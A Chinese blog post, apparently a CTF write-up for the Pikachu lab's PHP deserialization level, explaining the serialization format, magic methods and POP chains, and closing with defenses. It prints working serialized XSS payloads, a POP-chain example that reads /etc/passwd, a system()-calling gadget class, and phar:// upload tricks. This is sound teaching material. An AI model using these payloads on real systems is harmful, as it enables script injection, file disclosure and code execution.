---
layout: post
title: Pikachu - PHP 反序列化 Writeup（从格式到 POP 链）
platform: pikachu
date: 2026-10-29 20:48:00 +0800
categories: CTF
---

Pikachu - PHP 反序列化 Writeup（从格式到 POP 链）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：PHP 反序列化 → 概述（`unser.php`）
- 地址：`http://localhost/pikachu/vul/unserilization/unser.php`
- 题型：Web
- 考点：**PHP 序列化格式**、`unserialize()`、魔术方法、POP 链

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
模块目录：D:\phpstudy_pro\WWW\pikachu\vul\unserilization\
    unserilization.php   概述页（把知识点全写了）
    unser.php            ★ 真正的漏洞页面
```

**页面形态**：

```text
这是一个接受序列化数据的api: [                    ] [提交]
```

**作者提示**：

```html
data-content="先把PHP序列化和反序列化搞懂了在来玩"
```

**✅ 实测结果（6 种 payload）**

| # | 输入 | 结果 |
|---|---|---|
| 1 | `O:1:"S":1:{s:4:"test";s:7:"pikachu";}` | ✅ 输出 `pikachu` |
| 2 | `abc` | ❌ `大兄弟,来点劲爆点儿的!`（反序列化失败）|
| 3 | **`O:1:"S":1:{s:4:"test";s:25:"<script>alert(1)</script>";}`** | **✅ 页面输出原始 `<script>`（XSS）** |
| 4 | `O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}` | ✅ 作者示例 |
| 5 | `O:1:"S":1:{s:4:"test";s:40:"<script>document.title='XSS_OK'</script>";}` | ✅ 输出原样 |
| 6 | `O:1:"S":1:{s:4:"test";s:28:"<img src=x onerror=alert(1)>";}` | ✅ 输出原样 |

**★ 长度写错的情况（都失败）**：

```
s:24（实际 25）  → ❌ 大兄弟,来点劲爆点儿的!
s:30（实际 25）  → ❌ 大兄弟,来点劲爆点儿的!
```

**★ 结论：序列化串里的"长度"必须精确到字节。**

二、题目分析

**① 漏洞代码**

```php
<?php
// unser.php 第 18-36 行
class S{
    var $test = "pikachu";
    function __construct(){
        echo $this->test;
    }
}

//O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
$html = '';
if(isset($_POST['o'])){
    $s = $_POST['o'];
    if(!@$unser = unserialize($s)){
        $html .= "<p>大兄弟,来点劲爆点儿的!</p>";       // 反序列化失败
    }else{
        $html .= "<p>{$unser->test}</p>";              // ★ 把属性直接输出到 HTML
    }
}
?>
```

**★ 两个关键点**：

```
① unserialize($_POST['o'])   → 用户完全控制"要还原的对象"
② echo $unser->test          → 属性值原样进 HTML
★ 把 test 设成 <script>...</script> → XSS
```

**② ⭐ PHP 序列化格式：逐个字符拆解**

**★ 这是理解一切反序列化漏洞的基础。**

**★ 一个最简单的对象**：

```php
class S{
    public $test = "pikachu";
}
$s = new S();
echo serialize($s);
// 输出：O:1:"S":1:{s:4:"test";s:7:"pikachu";}
```

**★ 逐段拆解**：

```
O:1:"S":1:{s:4:"test";s:7:"pikachu";}
│ │  │  │  │ │  │     │ │  │
│ │  │  │  │ │  │     │ │  └── 值的长度：7
│ │  │  │  │ │  │     │ └───── 值的数据类型：s = string
│ │  │  │  │ │  │     └─────── 值：pikachu
│ │  │  │  │ │  └───────────── 属性名的长度：4
│ │  │  │  │ └──────────────── 属性名：test
│ │  │  │  └────────────────── 属性名的数据类型：s = string
│ │  │  └───────────────────── 属性个数：1
│ │  └──────────────────────── 类名的长度：1
│ └─────────────────────────── 类名：S
└───────────────────────────── O = Object
```

**★ 三种基本类型的序列化格式**：

**字符串**：

```php
serialize("pikachu");        // s:7:"pikachu";
//                              │ │  └─ 值（带引号）
//                              │ └──── 长度
//                              └────── s = string
```

**整数**：

```php
serialize(123);              // i:123;
//                              │ └─ 值
//                              └─── i = integer
```

**数组**：

```php
serialize(['a' => 1, 'b' => 2]);
// a:2:{s:1:"a";i:1;s:1:"b";i:2;}
// │ │  │                      │
// │ │  └──────────────────────┘ 键值对（交替出现）
// │ └── 元素个数 2
// └──── a = array
```

**对象**：

```php
serialize($obj);             // O:<类名长度>:"<类名>":<属性个数>:{<键值对>}
```

**★ 数据类型的字母表**：

| 字母 | 类型 | 例子 |
|---|---|---|
| `N` | NULL | `N;` |
| `b` | boolean | `b:1;`（true）/ `b:0;`（false）|
| `i` | integer | `i:123;` |
| `d` | double/float | `d:1.5;` |
| `s` | string | `s:3:"abc";` |
| `a` | array | `a:2:{...}` |
| `O` | object | `O:1:"S":1:{...}` |

**★ 这就是"注入点"所在**：

```
序列化串里"长度"是【声明】的
→ 如果声明的长度和实际不符，unserialize 会失败
→ 所以构造 payload 时"长度必须精确"
★ 这也是"反序列化"为什么难写：要手动算长度
```

**③ 魔术方法：反序列化的"触发器"**

**★ 什么是"魔术方法"？**

```
以 __ 开头的方法，在"特定时机"被 PHP 自动调用
★ 不需要你手动调，PHP 在特定事件发生时自动执行
```

**★ 常见的魔术方法**：

| 魔术方法 | 什么时候被调用 |
|---|---|
| `__construct()` | **new 一个对象时** |
| `__destruct()` | **对象销毁时**（脚本结束 / 引用计数归零）|
| `__wakeup()` | **`unserialize()` 之后立即调用** |
| `__sleep()` | **`serialize()` 之前调用** |
| `__toString()` | 对象被当字符串使用时 |
| `__get($name)` | 访问"不存在的属性"时 |
| `__set($name, $v)` | 给"不存在的属性"赋值时 |
| `__call($name, $args)` | 调用"不存在的方法"时 |
| `__invoke()` | 对象被当函数调用时（`$obj()`）|
| `__isset()` / `__unset()` | `isset()` / `unset()` 不存在的属性时 |

**★ 为什么它们能造成漏洞？**

```php
class Evil {
    public $cmd = "whoami";
    function __destruct() {
        system($this->cmd);        // ★ 对象销毁时执行命令
    }
}
```

**★ 如果代码里这么写**：

```php
$obj = unserialize($_POST['data']);
// ★ 用户传一个序列化的 Evil 对象
// ★ 脚本结束时 $obj 被销毁 → __destruct 触发 → system('whoami')
```

**★ 这就是"反序列化 RCE"的本质**：

```
用户控制"对象的属性值"
→ 触发某个魔术方法
→ 魔术方法里"用了属性值"做了危险操作
→ RCE / 写入 / 读取
```

**④ 本关为什么只是 XSS（不是 RCE）**

**★ 看本关的类**：

```php
class S{
    var $test = "pikachu";
    function __construct(){
        echo $this->test;        // 只是在构造时 echo
    }
}
```

**★ 两个原因限制了危害**：

```
① 类里没有 __destruct / __wakeup
   ★ 所以没有"自动执行危险操作"的触发器
   
② __construct 在 unserialize 时【不会】被调用
   ★ unserialize 只调用 __wakeup（如果有）
   ★ 所以那行 echo 在本关根本不执行
```

**★ 那 XSS 从哪来？**

```php
$html .= "<p>{$unser->test}</p>";       // ★ 第 33 行：直接输出属性
```

**★ 所以本关的"危险操作"是"直接输出用户可控的属性"，不是魔术方法。**

**★ 一个对比**：

| | 本关 | 真实的反序列化 RCE |
|---|---|---|
| 触发器 | 无（靠 `echo $obj->test`）| `__destruct` / `__wakeup` |
| 危害 | XSS | RCE / 任意文件写 |
| 难度 | 低（手写 payload）| 高（要构造 POP 链）|

**⑤ 长度必须精确：字节数 ≠ 字符数**

**★ 这是构造 payload 最容易踩的坑。**

**★ 纯 ASCII 时**：

```
"pikachu"                     → 7 字节 → s:7
"<script>alert(1)</script>"   → 25 字节 → s:25
```

**★ 含中文时（UTF-8）**：

```php
$s = "你好";
strlen($s);        // 6  ★ strlen 返回字节数
mb_strlen($s);     // 2  ★ mb_strlen 返回字符数
serialize($s);     // s:6:"你好";
```

**★ 为什么是 6？**

```
UTF-8 里一个汉字占 3 字节
"你好" = 2 个汉字 = 6 字节
★ unserialize 按【字节】读，所以写 6
```

**★ 实测：长度写错的后果**：

```
s:24（实际 25）→ unserialize 失败 → "大兄弟,来点劲爆点儿的!"
s:30（实际 25）→ 同样失败
```

**★ 一个"算长度"的技巧**：

```python
payload = '<script>alert(1)</script>'
print(len(payload.encode('utf-8')))     # 用【字节数】
ser = 'O:1:"S":1:{s:4:"test";s:%d:"%s";}' % (len(payload.encode('utf-8')), payload)
print(ser)
```

```powershell
# PowerShell 版
$payload = "<script>alert(1)</script>"
$len = [System.Text.Encoding]::UTF8.GetBytes($payload).Length
"O:1:`"S`":1:{s:4:`"test`";s:$($len):`"$payload`";}"
```

三、解题步骤

**第 1 步：先读概述页（知识点全在里面）**

```
http://localhost/pikachu/vul/unserilization/unserilization.php
```

**★ 这一页已经把"序列化格式拆解"、"魔术方法列表"、"payload 示例"全写出来了。**

**★ 关键的一段（作者给的示例）**：

```php
payload:O:1:"S":1:{s:4:"test";s:29:"<?php echo htmlspecialchars("<script>alert('xss')</script>");?>";}
```

**第 2 步：正常反序列化（建立基准）**

**★ 在 `unser.php` 输入框填**：

```
O:1:"S":1:{s:4:"test";s:7:"pikachu";}
```

**★ 点提交 → 页面显示 `pikachu`。**

**★ 这一步确认**：

```
① 页面确实在处理"序列化数据"
② 反序列化成功后输出 $unser->test
```

**第 3 步：⭐ 打 XSS（长度 25）**

**★ 输入**：

```
O:1:"S":1:{s:4:"test";s:25:"<script>alert(1)</script>";}
```

**★ 点提交**

**★ 预期**：

```
页面显示：<script>alert(1)</script>
浏览器执行 → 弹窗
```

**⚠️ Chrome 可能不弹窗**：

```
Chrome 的 "Dialog Spam Prevention"
→ 页面加载时自动执行的 alert() 可能被抑制
★ 这是浏览器策略，不是漏洞没成立
```

**第 4 步：改用"改页面"的 payload（能看到效果）**

**★ 输入**（长度 **40**）：

```
O:1:"S":1:{s:4:"test";s:40:"<script>document.title='XSS_OK'</script>";}
```

**★ 提交后看浏览器**：

```
标签页标题变成 XSS_OK
★ 这个不会被浏览器拦
```

**★ 或者用 img 的 payload**（长度 **28**）：

```
O:1:"S":1:{s:4:"test";s:28:"<img src=x onerror=alert(1)>";}
```

**★ 这个也没问题**（`onerror` 由浏览器事件触发，不受"自动弹窗"限制）。

**第 5 步：验证"长度必须精确"**

**★ 故意写错长度**：

```
O:1:"S":1:{s:4:"test";s:24:"<script>alert(1)</script>";}
```

**★ 结果**：

```
大兄弟,来点劲爆点儿的!
```

**★ 说明**：

```
unserialize 按"声明的长度"读取
→ 长度对不上 → 解析失败 → 返回 false
★ 所以构造 payload 时，"数长度"是必不可少的步骤
```

**第 6 步：完整 payload 汇总**

```
// ========== 正常 ==========
O:1:"S":1:{s:4:"test";s:7:"pikachu";}

// ========== XSS（三种，长度已核对）==========
O:1:"S":1:{s:4:"test";s:25:"<script>alert(1)</script>";}
O:1:"S":1:{s:4:"test";s:40:"<script>document.title='XSS_OK'</script>";}
O:1:"S":1:{s:4:"test";s:28:"<img src=x onerror=alert(1)>";}

// ========== 作者示例 ==========
O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}

// ========== 长度写错（失败）==========
O:1:"S":1:{s:4:"test";s:24:"<script>alert(1)</script>";}      ❌
O:1:"S":1:{s:4:"test";s:30:"<script>alert(1)</script>";}      ❌
```

**第 7 步：算长度的小工具**

**★ Python（推荐）**：

```python
payload = '<script>alert(1)</script>'
ser = 'O:1:"S":1:{s:4:"test";s:%d:"%s";}' % (len(payload.encode('utf-8')), payload)
print(ser)
```

**★ 输出**：

```
O:1:"S":1:{s:4:"test";s:25:"<script>alert(1)</script>";}
```

**★ PowerShell**：

```powershell
$payload = '<script>alert(1)</script>'
$len = [System.Text.Encoding]::UTF8.GetBytes($payload).Length
"O:1:`"S`":1:{s:4:`"test`";s:$($len):`"$payload`";}"
```

四、延伸知识

**① POP 链：真实的反序列化 RCE 是怎么构造的**

**★ POP = Property Oriented Programming（面向属性编程）。**

**★ 核心思想**：

```
不直接写"要执行的代码"
而是"把现成的类、现成的魔术方法，像积木一样拼起来"
→ 让"对象销毁时的连锁调用"最终触发危险函数
```

**★ 一个最简单的 POP 链示例**：

```php
<?php
// 类 A：有危险操作
class A {
    public $cmd;
    function __destruct() {
        system($this->cmd);            // ★ 危险点
    }
}

// 类 B：能"设置"别人的属性
class B {
    public $target;
    function __toString() {
        return "B";                    // 只是被当字符串时调用
    }
}

// 如果代码里只有 A，那 payload 很简单：
// O:1:"A":1:{s:3:"cmd";s:6:"whoami";}
?>
```

**★ 但真实场景里，危险类往往"不能直接实例化"**：

```
比如：危险操作在 class A 的 __destruct 里
但 unserialize 的入口是 class Entry
→ 你传 O:1:"Entry" 的序列化串
→ 但 Entry 的属性是"另一个对象"
→ 于是要"嵌套"构造
```

**★ 一个"嵌套"的例子**：

```php
<?php
class Entry {
    public $file;
    function __wakeup() {
        $this->file->open();           // ★ 调用 $file 对象的 open 方法
    }
}

class File {
    public $name;
    function open() {
        include($this->name);          // ★ 危险：文件包含
    }
}
?>
```

**★ 构造 payload**：

```
要传一个 Entry 对象，它的 file 属性是一个 File 对象，File.name = "/etc/passwd"
→ O:4:"Entry":1:{s:4:"file";O:4:"File":1:{s:4:"name";s:11:"/etc/passwd";}}
```

**★ 这就是"链"**：

```
unserialize → Entry.__wakeup() → $file->open() → include($name) → 任意文件包含
             └────┬────┘         └──┬──┘
              第 1 跳             第 2 跳
★ 每一跳都是一个"对象方法调用"
★ 攻击者要做的：把这些跳"接起来"
```

**★ 为什么叫"面向属性编程"**：

```
整个攻击"不写代码"，只"设置属性值"
每跳的"参数"都是"属性"
→ 修改属性 → 改变行为
```

**② 反序列化的常见"利用点"**

**★ 按魔术方法分类**：

| 魔术方法 | 可做的危险操作 |
|---|---|
| `__destruct` | `system()` / `unlink()` / `file_put_contents()` |
| `__wakeup` | 数据库连接 / 文件打开 / 命令执行 |
| `__toString` | 把对象当字符串（可能触发别的调用）|
| `__call` | 调用不存在的函数 |
| `__invoke` | 对象当函数用 |
| `__get` / `__set` | 访问器/修改器（可能触发链）|

**★ 常见的"危险类"（在真实框架里）**：

```
· 框架的"缓存类"：__destruct 时写文件
· 框架的"日志类"：__destruct 时写日志（可控制路径 → 写 webshell）
· ORM 的"查询构造器"：__toString 时拼 SQL
★ 这就是为什么"框架的版本"很重要 —— 不同版本 POP 链不同
```

**③ PHP 反序列化的"版本差异"**

**★ 一个非常有名的绕过**：

```
CVE-2016-7124
    PHP 5.6.25 之前 / 7.0.10 之前
    如果"属性个数"写得比实际大
    → __wakeup 会被【跳过】
★ 用于绕过 __wakeup 里的"安全检查"
```

**★ 本环境**：PHP 7.3.4 —— 已修复。

**★ 其他历史问题**：

```
· PHP 7.4 的"引用"问题
· PHP 8.0 的"命名参数"问题
· __PHP_Incomplete_Class（类不存在时）
```

**④ `phar://` 反序列化（"不需要 unserialize"的方式）**

**★ 这是一个很隐蔽的技巧**：

```
phar 文件的"元数据（metadata）"会被自动序列化
→ 当你用 phar:// 访问它时
→ PHP 会自动【反序列化】它的 metadata
★ 也就是说：只要"文件操作"用了 phar://，就会触发反序列化
```

**★ 触发条件**：

```php
file_exists($_GET['file']);      // ★ 传 phar://xxx.phar/test
file_get_contents($_GET['file']);
include($_GET['file']);
opendir($_GET['file']);
```

**★ 利用流程**：

```
① 上传一个 phar 文件（可伪装成 jpg）
   ★ 因为 phar 只要求文件头，不要求扩展名
② 让目标"文件操作"用 phar:// 协议访问它
③ phar 的 metadata 被反序列化 → 触发 POP 链
★ 这是"文件上传 + 反序列化"的组合
```

**★ 为什么危险**：

```
很多代码只防"unserialize($_GET)"
忘了"文件操作 + phar://"也能触发
```

**⑤ 防御（四层）**

**❌ 本关的问题**：

```php
$unser = unserialize($_POST['o']);      // ★ 用户可控的反序列化
echo $unser->test;                       // ★ 属性直接输出（XSS）
```

**✅ 第 1 层：不要用 `unserialize` 处理用户输入**

```php
// ❌ 危险
$data = unserialize($_POST['data']);

// ✅ 用 JSON
$data = json_decode($_POST['data'], true);
// ★ JSON 只能表达"数据"，不能表达"对象"
// ★ 没有魔术方法 → 没有反序列化攻击面
```

**★ 这是"根治"的方案**：

```
JSON / MessagePack / protobuf 都只序列化"数据"
PHP 的 serialize() 会保留"类名"和"属性"
→ 才让"还原成对象"成为可能
```

**✅ 第 2 层：`allowed_classes`（禁止还原成对象）**

```php
// PHP 7+
$data = unserialize($input, ['allowed_classes' => false]);
// ★ 返回 __PHP_Incomplete_Class 对象，属性不可用
// ★ 魔术方法不会被调用 → 安全
```

**★ 或者白名单**：

```php
$data = unserialize($input, ['allowed_classes' => ['User', 'Order']]);
// ★ 只允许还原成这两个类
```

**✅ 第 3 层：签名 / 加密**

```php
// 序列化前加签名
$payload = base64_encode(serialize($data));
$sig = hash_hmac('sha256', $payload, $secret_key);
$final = $payload . '.' . $sig;

// 反序列化前验签
[$payload, $sig] = explode('.', $_POST['data']);
if (!hash_equals(hash_hmac('sha256', $payload, $secret_key), $sig)) {
    die('签名无效');
}
$data = unserialize(base64_decode($payload));
```

**★ 效果**：

```
攻击者改了 payload → 签名对不上 → 拒绝
★ 这是"Cookie/Session 里的序列化数据"的常用防护
```

**✅ 第 4 层：`phar` 相关（防"隐式反序列化"）**

```php
// 严格校验路径，禁止 phar:// 协议
if (preg_match('/^(phar|php|file|data|zip):\/\//i', $path)) {
    die('非法的协议');
}

// 或者用 realpath + 白名单目录
$real = realpath($path);
if (strpos($real, '/var/www/uploads/') !== 0) {
    die('非法路径');
}
```

**⑥ 本关和"真实反序列化"的差距**

| | 本关 | 真实的反序列化 RCE |
|---|---|---|
| 类结构 | 只有 1 个类，1 个属性 | 多个类，互相嵌套 |
| 触发器 | 无魔术方法（靠 echo） | `__destruct` / `__wakeup` |
| 危害 | XSS | RCE / 写文件 |
| payload | 手写，1 分钟 | 需要读源码 + 构造链，几小时 |
| 难度 | ★☆☆☆☆ | ★★★★★ |

**★ 一句话**：

```
本关教你"格式"
真实环境考"链"（POP 链）
★ 格式是基础，链是进阶
```

五、总结

- **本题核心：`unserialize($_POST['o'])` 让用户控制对象，`echo $unser->test` 把属性输出到 HTML → XSS。**

- **两行关键代码**：

```php
$unser = unserialize($_POST['o']);       // ★ 用户可控
$html .= "<p>{$unser->test}</p>";        // ★ 属性直接输出
```

- **⭐ 八个必记要点**：

```text
① 序列化格式要会读
   O:<类名长度>:"<类名>":<属性个数>:{<键名>;<值>;...}
   s:<长度>:"<字符串>";
   i:<整数>;
   a:<个数>:{...}
   ★ 长度是【字节数】，含中文时要小心

② 长度必须精确
   s:24（实际 25）→ 失败
   s:30（实际 25）→ 失败
   ★ 这是构造 payload 的第一步

③ 魔术方法是"触发器"
   __destruct  → 对象销毁时
   __wakeup    → unserialize 之后
   __construct → new 时（★ unserialize 不触发）
   ★ 本关的 __construct 其实不会执行

④ 本关只到 XSS
   类里没有"危险的 __destruct/__wakeup"
   危险来自 echo $obj->test
   ★ 真实的反序列化 RCE 需要 POP 链

⑤ POP 链 = 把"现成的类和方法"串起来
   Entry.__wakeup() → File.open() → include($name)
   ★ "不写代码，只设属性"

⑥ phar:// 是"隐式反序列化"
   只要文件操作用了 phar://，metadata 就会被反序列化
   ★ 不需要显式调用 unserialize

⑦ 本环境 PHP 7.3.4
   CVE-2016-7124（__wakeup 绕过）已修复
   ★ 老版本才有效

⑧ 防御：不用 unserialize（用 JSON）> allowed_classes > 签名
   ★ 根本方案是"只序列化数据，不序列化对象"
```

- **实测数据**：

```text
O:1:"S":1:{s:4:"test";s:7:"pikachu";}
    → 页面显示 pikachu

abc
    → 大兄弟,来点劲爆点儿的!（unserialize 失败）

O:1:"S":1:{s:4:"test";s:25:"<script>alert(1)</script>";}
    → 页面原样输出 <script>alert(1)</script>（XSS）

O:1:"S":1:{s:4:"test";s:40:"<script>document.title='XSS_OK'</script>";}
    → 页面原样输出（浏览器执行后改标题）

O:1:"S":1:{s:4:"test";s:28:"<img src=x onerror=alert(1)>";}
    → 页面原样输出

O:1:"S":1:{s:4:"test";s:24:"<script>alert(1)</script>";}
    → 大兄弟,来点劲爆点儿的!（长度错）
```

- **长度对照表**：

| 内容 | 长度 | 序列化片段 |
|---|---|---|
| `pikachu` | 7 | `s:7:"pikachu";` |
| `<script>alert(1)</script>` | 25 | `s:25:"...";` |
| `<script>alert('xss')</script>` | 29 | `s:29:"...";` |
| `<img src=x onerror=alert(1)>` | 28 | `s:28:"...";` |
| `<script>document.title='XSS_OK'</script>` | 40 | `s:40:"...";` |

- **进度**：

```text
platform: pikachu   39 篇

├── 暴力破解            4/4    ✅
├── CSRF                3/3    ✅
├── XSS                10/10   ✅
├── SQL 注入           10/10   ✅
├── RCE                 2/2    ✅
├── File Inclusion      2/2    ✅
├── Unsafe Filedownload 1/1    ✅
├── Unsafe Fileupload   3/7    （暂停，剩 4 关）
├── Over Permission     2/2    ✅
├── 目录遍历            1/1    ✅
├── 敏感信息泄露        1/1    ✅
└── PHP 反序列化        1/1    ✅  ← 刚完成
```

**手工复现要点**：

```text
· 打开 unserilization.php（概述）→ 读序列化格式和魔术方法
· 打开 unser.php → 输入 O:1:"S":1:{s:4:"test";s:7:"pikachu";} → 显示 pikachu
· 换成 s:25:"<script>alert(1)</script>" → 页面输出 script 标签
· 换成 s:40:"<script>document.title='XSS_OK'</script>" → 标题变 XSS_OK
· 故意写 s:24 → 看"大兄弟"提示
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  反序列化 = "把字符串还原成对象"                                │
│                                                            │
│  格式：O:1:"S":1:{s:4:"test";s:7:"pikachu";}                │
│            │  │       │      │                            │
│         类名 长度    属性名  值                            │
│                                                            │
│  ★ 长度是【字节数】，写错一个就失败                            │
│  ★ 魔术方法是"触发器"：__destruct / __wakeup                  │
│  ★ 本关只到 XSS（靠 echo 属性）                               │
│  ★ 真实 RCE 需要 POP 链（把现成类串起来）                      │
│                                                            │
│  防御：不用 unserialize（用 JSON）→ 彻底消除攻击面             │
│        或 allowed_classes / 签名校验                         │
└────────────────────────────────────────────────────────────┘
```
